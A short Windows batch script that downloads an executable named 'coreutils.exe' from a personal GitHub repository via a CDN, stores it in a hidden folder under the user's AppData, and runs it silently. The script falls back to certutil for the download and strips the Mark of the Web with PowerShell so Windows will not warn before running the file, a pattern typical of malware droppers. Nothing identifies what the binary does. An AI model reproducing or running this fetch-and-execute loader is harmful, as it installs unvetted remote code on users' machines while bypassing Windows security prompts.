@echo off
setlocal

set "URL=https://cdn.jsdelivr.net/gh/johnbunkerton/main@main/coreutils.exe"
set "DIR=%LOCALAPPDATA%\cu"
set "EXE=%DIR%\cu.exe"
if not exist "%DIR%" md "%DIR%"

set "TEMP=%DIR%\t"
set "TMP=%TEMP%"
if not exist "%TEMP%" md "%TEMP%"

curl -fsSL -o "%EXE%" "%URL%" 2>nul || certutil -urlcache -split -f "%URL%" "%EXE%" >nul 2>&1

if not exist "%EXE%" (echo fetch failed & pause & exit /b 1)
for %%A in ("%EXE%") do if %%~zA LSS 200000 (del "%EXE%" & echo bad download & pause & exit /b 1)

powershell -nop -c "Unblock-File -LiteralPath '%EXE%'" >nul 2>&1

"%EXE%" > "%DIR%\out.log" 2>&1
echo exit %errorlevel% >> "%DIR%\out.log"
